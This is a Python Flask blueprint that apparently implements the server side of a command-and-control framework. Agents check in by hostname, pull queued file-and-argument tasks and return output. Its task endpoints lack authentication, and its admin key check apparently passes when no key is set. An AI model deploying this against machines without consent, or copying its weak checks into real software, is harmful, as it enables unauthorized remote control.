from flask import Blueprint
from flask import request
import json

from .console import Color
from .database import *
from .transport import Transport

# API Service
service = Blueprint("service", __name__, url_prefix="/service")

serviceConf: dict = {
    "online": True,
    "logging": False,
    "secret_key": None
}

@service.route("/", methods = {"GET"})
def status():
    if serviceConf["online"]:
        return Transport("online").dump()
    else:
        return Transport("offline").dump()

@service.route("/bind", methods = {"POST"})
def bind():
    jdata: dict = json.loads(Transport(request.data.decode()).load())

    if not "hostname" in jdata.keys():
        return Transport("FAILED").dump()
    hostname: str = jdata["hostname"]

    if Agent.exists(hostname=hostname):
        Agent.update_beacon(hostname)
        if serviceConf: print(f":: {Color.Green}✔{Color.White} Checked in Agent: {hostname}"+Color.Reset)
    else:
        newAgent = Agent(hostname=hostname)
        db.session.add(newAgent)
        db.session.commit()
        if serviceConf: print(f":: {Color.Green}✔{Color.White} Added new Agent: {hostname}"+Color.Reset)

    return Transport("OK").dump()

@service.route("/task", methods = {"GET", "POST", "DELETE"})
def task():
    jdata: dict = json.loads(Transport(request.data.decode()).load())

    if not "hostname" in jdata.keys():
        if serviceConf: print(f":: {Color.Red}✘{Color.White} No hostname was given!"+Color.Reset)
        return Transport("FAILED").dump()
    hostname: str = jdata["hostname"]

    if not Agent.exists(hostname=hostname):
        if serviceConf: print(f":: {Color.Red}✘{Color.White} Invalid hostname!"+Color.Reset)
        return Transport("FAILED").dump()

    if request.method == "POST":
        if not "task" in jdata.keys():
            if serviceConf: print(f":: {Color.Red}✘{Color.White} No task was given!"+Color.Reset)
            return Transport("FAILED").dump()
        jtask = jdata["task"]
        keys = jtask.keys()
    
        if not "file" in keys or not "args" in keys or not "verbose" in keys:
            if serviceConf: print(f":: {Color.Red}✘{Color.White} No file, args or verbose atribute for task was given!"+Color.Reset)
            return Transport("FAILED").dump()
        file: str = jtask["file"]
        args: list[str] = json.dumps(jtask["args"])
        verbose: bool = jtask["verbose"]

        agent_id = Agent.get_by_hostname(hostname).id
        newTask = Task(file=file, args=args, verbose=verbose, agent_id=agent_id)
        db.session.add(newTask)
        db.session.commit()

        if serviceConf: print(f":: {Color.Green}✔{Color.White} Added new Task for Agent: {hostname}"+Color.Reset)

        return Transport(str(newTask.id)).dump()
    else:
        Agent.update_beacon(hostname)
        if serviceConf: print(f":: {Color.Green}✔{Color.White} Geting next Task for Agent: {hostname}"+Color.Reset)
        task = Agent.get_nextTask(hostname)
        if task != None:
            return Transport(task.jsonify()).dump()
        return Transport("NONE").dump()

@service.route("/reply", methods = {"POST", "GET"})
def reply():
    jdata: dict = json.loads(Transport(request.data.decode()).load())

    if not "hostname" in jdata.keys():
        if serviceConf: print(f":: {Color.Red}✘{Color.White} No hostname was given!"+Color.Reset)
        return Transport("FAILED").dump()
    hostname: str = jdata["hostname"]

    if not Agent.exists(hostname=hostname):
        if serviceConf: print(f":: {Color.Red}✘{Color.White} Invalid hostname!"+Color.Reset)
        return Transport("FAILED").dump()
    Agent.update_beacon(hostname)

    if not "task_id" in jdata.keys():
        if serviceConf: print(f":: {Color.Red}✘{Color.White} No task_id was given!"+Color.Reset)
        return Transport("FAILED").dump()
    task_id: str = jdata["task_id"]

    if request.method == "POST":
        Agent.update_beacon(hostname)
        if not "content" in jdata.keys():
            if serviceConf: print(f":: {Color.Red}✘{Color.White} No content was given!"+Color.Reset)
            return Transport("FAILED").dump()
        content: str = jdata["content"]

        if serviceConf: print(f":: {Color.Green}✔{Color.White} Setting reply for Task: {task_id}"+Color.Reset)
        Task.get_by_id(task_id).set_reply(content)

        return Transport("OK").dump()
    else:
        task = Task.get_by_id(task_id)
        if task is None:
            return Transport("NONE").dump()
        else:
            if serviceConf: print(f":: {Color.Green}✔{Color.White} Getting reply of Task: {task_id}"+Color.Reset)
            return  Transport(task.get_reply()).dump()

@service.route("/agents", methods = {"DELETE", "GET"})
def deleteAll():
    if request.headers.get("key") == serviceConf["secret_key"]:
        if request.method == "DELETE":
            Agent.delete_all()
            if serviceConf["logging"]: print(f":: {Color.Magenta}✔{Color.White} Deleted all Agents!"+Color.Reset)
            return Transport("DELETED AGENTS").dump()
        else:
            agents = Agent.query.all()
            if agents is None:
                return Transport("NONE").dump()

            dict_repr = dict()
            for agent in agents:
                dict_repr[str(agent.id)] = {
                    "hostname": agent.hostname,
                    "beacon": str(agent.beacon)
                }
            return Transport(json.dumps(dict_repr)).dump()
    else:
        if serviceConf["logging"]: print(f":: {Color.Blue}✘{Color.White} Invalid key!"+Color.Reset)
        return Transport("FAILED").dump()